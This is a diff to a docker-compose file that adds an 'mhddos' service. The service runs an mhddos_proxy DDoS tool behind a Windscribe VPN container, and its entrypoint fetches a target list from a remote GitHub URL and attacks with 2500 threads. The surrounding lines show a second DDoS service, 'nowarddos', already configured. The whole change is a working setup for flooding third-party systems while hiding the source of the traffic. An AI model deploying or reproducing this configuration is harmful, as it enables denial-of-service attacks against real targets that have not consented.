@@ -23,6 +23,15 @@ services:
       - NET_ADMIN
     restart: unless-stopped 
 
+  mhddos:
+    depends_on: 
+      - docker-windscribe
+    restart: unless-stopped
+    network_mode: "service:docker-windscribe"
+    image: ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest
+    # example command
+    entrypoint: "python3 ./runner.py -c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/tender/tender_l4_tcp -t 2500 --rpc 2000 --debug"
+
   nowarddos:
     depends_on: 
       - docker-windscribe
